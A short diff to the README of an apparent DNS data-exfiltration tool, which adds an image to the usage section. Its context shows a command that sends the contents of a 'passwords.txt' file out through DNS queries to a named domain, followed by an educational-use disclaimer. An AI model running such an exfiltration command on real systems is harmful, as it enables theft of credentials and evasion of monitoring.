@@ -44,6 +44,8 @@ python3 ./client.py -d "google.com" -f "passwords.txt"
 
 In this example, `google.com` is the domain to which the DNS queries will be sent, and `passwords` is the file containing the data to be exfiltrated.
 
+![](https://i.imgur.com/f2D0Z7p.png)
+
 ### Note
 
 This project is for educational purposes only. Unauthorized data exfiltration is illegal and unethical. Always obtain proper authorization before testing any security mechanism.
